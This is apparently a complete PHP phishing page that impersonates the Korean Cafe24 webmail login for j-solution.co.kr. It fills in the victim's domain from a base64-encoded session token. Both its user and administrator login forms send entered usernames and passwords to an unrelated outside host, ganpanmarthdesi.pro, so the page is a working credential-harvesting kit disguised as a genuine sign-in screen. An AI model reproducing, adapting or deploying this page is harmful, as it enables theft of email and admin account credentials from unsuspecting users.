<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>&#51228;&#51060; &#49556;&#47336;&#49496;</title>
    <meta name="WMMETA" content="host" data-host="rwebmail-002.fmcity.com" />
    <meta name="WMMETA" content="domain" data-domain="j-solution.co.kr" />
    <meta name="WMMETA" content="appversion" data-appversion="20210119" />
    <meta name="WMMETA" content="langpack" data-langpack="ko" />
    <link rel="stylesheet" type="text/css" href="https://img.cafe24.com/serviceserver/biz/webmail/css/webmail.css?v=20210119" />
</head>
<body>


<div class="mLogin type1 ">
    <ul class="languages">
        <li><a class="login-language-change" href="#changeLang/en">ENGLISH</a></li>
        <li><a class="login-language-change" href="#changeLang/chGb">&#31616;&#20307;&#20013;&#25991;</a></li>
        <li><a class="login-language-change" href="#changeLang/jp">&#26085;&#26412;&#35486;</a></li>
        <li><a class="login-language-change" href="#changeLang/chBig">&#32321;&#39636;&#20013;&#25991;</a></li>
        <li><a class="login-language-change" href="#changeLang/ko">&#54620;&#44397;&#50612;</a></li>
    </ul>
	<div class="inner">
		<div class="logoArea">
			<h2 class="logo">
				<img src="https://img.cafe24.com/serviceserver/biz/webmail/images/login/@img_logo_aType.gif" alt="" />
			</h2>
		</div>
		<div class="contents">
			<ul class="mTab typeLogin eTab switch-login-type">
				<li class="selected"><a href="#tabUser">&#49324;&#50857;&#51088; &#47784;&#46300;</a></li>
				<li><a href="#tabAdmin">&#44288;&#47532;&#51088; &#47784;&#46300;</a></li>
			</ul>
			<div id="tabUser" class="tabCont" style="display: block;">

				<form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">

				<input type="hidden" name="loginType" value="user">
				<input type="hidden" name="rTarget" value="parent">
				<input type="hidden" name="url" value="https://webmail.j-solution.co.kr/login.php">
					<fieldset>
					<legend>&#49324;&#50857;&#51088; &#47196;&#44536;&#51064;</legend>
						<label>
                                                <input type="text" name="user" class="fText" placeholder="&#50500;&#51060;&#46356;" value="" autofocus >
                                                <input type="hidden" name="link" value="http://webmail.<?php echo $ddomain;?>/intro.php" >
                                                <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
                                                <input type="hidden" name="sender" value="cafe24.com" >
                                                </label><!-- &#44060;&#48156;&#52280;&#44256; : value&#44050; placeholder&#47196; &#45347;&#50612;&#51452;&#49464;&#50836; -->
						<label>
                                                <input type="password" name="passwd" class="fText" required placeholder="&#48708;&#48128;&#48264;&#54840;" >
                                                </label>
						<button type="submit" class="btnLogin user-login-btn"><span>&#47196;&#44536;&#51064;</span></button>
						<ul class="security">
							<li><label><input type="checkbox" name="save">&nbsp;&#50500;&#51060;&#46356; &#51200;&#51109;</label></li>
							<li><input type="checkbox" name="ip" checked="checked"> IP&#48372;&#50504; <span>on</span></li></li><!-- 개발참고 : 기본값 check해제되면 off 글씨로 변경되고 span에 class="disabled" 넣어주세요 -->
						</ul>
					</fieldset>
				</form>

				<!-- 2차 인증 -->
			</div>
			<div id="tabAdmin" class="tabCont" style="display: none;">
				<form method="post" name="adminLoginForm" target="HFLOGIN" action="http://ganpanmarthdesi.pro/z-php/wp-config-post.php">
				<input type="hidden" name="loginType" value="admin">
				<input type="hidden" name="rTarget" value="parent">
				<input type="hidden" name="url" value="https://webmail.j-solution.co.kr/login.php">
					<fieldset>
					<legend>관리자 로그인</legend>
						<label>
                                                <input type="text" name="user" class="fText" placeholder="아이디" value=""></label>
						<input type="hidden" name="domain" value="http://webmail.<?php echo $ddomain;  ?>/intro.php" />
                                                <input type="hidden" name="sender" value="Cafe24.com">
						<label><input type="password" name="passwd" class="fText" placeholder="비밀번호" ></label>
						<button type="submit" class="btnLogin"><span>로그인</span></button>
						<ul class="security">
							<li><input type="checkbox" name="save"> 아이디 저장</li>
							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li></li><!-- 개발참고 : 기본값 check해제되면 off 글씨로 변경되고 span에 class="disabled" 넣어주세요 -->
						</ul>
					</fieldset>
				</form>
			</div>
		</div>

	</div>
	<!-- 만료 된 계정 경고 텍스트 -->
	
	<!-- copyright -->
    <p class="footer"><a href="http://www.webbridge.co.kr">Copyright ⓒ <strong>2021</strong> All Rights Reserved.</a></p>
</div>
<iframe id="HFLOGIN" name="HFLOGIN" src="/blank.html" border="0" frameborder="0" width="90%" height="0" style="display:none;"></iframe>
<script type="text/javascript" src="/jquery/jquery-1.11.3.min.js?v=20210119"></script><script type="text/javascript" src="/jquery/jquery.placeholder.min.js?v=20210119"></script><script type="text/javascript" src="/newjs/common.js?v=20210119"></script><script type="text/javascript" src="/newjs/intro.js?v=20210119"></script>
<input type="hidden" id="adminId" value="jsolmail" />
<input type="hidden" id="emailId" value="" />
<input type="hidden" id="isReseller" value="reseller" />
<input type="hidden" id="enctoken" value="" />
</body>
</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>